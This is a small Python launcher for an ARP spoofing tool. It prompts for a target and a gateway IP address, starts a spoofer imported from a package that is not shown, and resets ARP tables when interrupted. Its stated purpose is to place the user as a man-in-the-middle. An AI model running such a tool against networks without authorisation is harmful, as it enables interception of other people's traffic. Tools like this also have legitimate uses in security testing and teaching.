from packages.arp_spoofer.arp_spoof import Spoofer
import inquirer

def main():
    try:
        questions = [
        # validate=validate_ip
        inquirer.Text("target_ip", message="Enter the target/client IP address"),
        inquirer.Text("gateway_ip", message="Enter the gateway/access point IP address"),
        ]
        answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)
        target_ip = answers["target_ip"]
        gateway_ip = answers["gateway_ip"]
        spoofer = Spoofer(target_ip, gateway_ip)
    except TypeError:
        pass
    except KeyboardInterrupt:
        try:
            print("\n[x] ARP Spoofer terminated by user. Resetting ARP tables...\n")
            spoofer.restore_defaults(target_ip, gateway_ip)
            spoofer.restore_defaults(gateway_ip, target_ip)
        except:
            print("[-] Unable to reset ARP tables. You'll need to do this manually, it seems...")
            
if __name__ == "__main__":
    main()

# description="Conduct an ARP Spoof to establish self as MITM between target client and gateway."